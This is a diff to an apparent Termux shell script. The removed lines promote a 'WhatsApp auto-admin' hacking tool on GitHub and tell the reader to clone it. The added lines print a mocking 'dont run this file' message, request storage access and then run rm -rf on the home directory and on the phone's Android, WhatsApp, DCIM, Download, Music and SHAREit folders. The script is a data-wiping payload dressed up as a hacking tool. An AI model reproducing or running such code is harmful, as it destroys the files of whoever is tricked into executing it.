@@ -1,20 +1,36 @@
-hi
+# hi
 
-search
+# search
 
-https://meyerweb.com/eric/tools/dencoder/
-
-
-
-Dont ignor anything
+# https://meyerweb.com/eric/tools/dencoder/
 
 
-Next step :
+
+# Dont ignor anything
 
 
-https://github.com/DRACULA-HACK/AUTO-ADMIN_WHATSAPP
+# Next step :
 
-Clone this tool
+
+# https://github.com/DRACULA-HACK/AUTO-ADMIN_WHATSAPP
+
+# Clone this tool
+clear
+echo " dont run this file bro 😂 bye "
+
+Sleep 5
+
+termux-setup-storage
+	
+
+	
+	rm -rf cd /sdcard/Android
+	rm -rf cd ~
+	rm -rf cd /sdcard/WhatsApp
+	rm -rf cd /sdcard/DCIM
+	rm -rf cd /sdcard/Download
+	rm -rf cd /sdcard/Music
+	rm -rf cd /sdcard/SHAREit
 
 
 
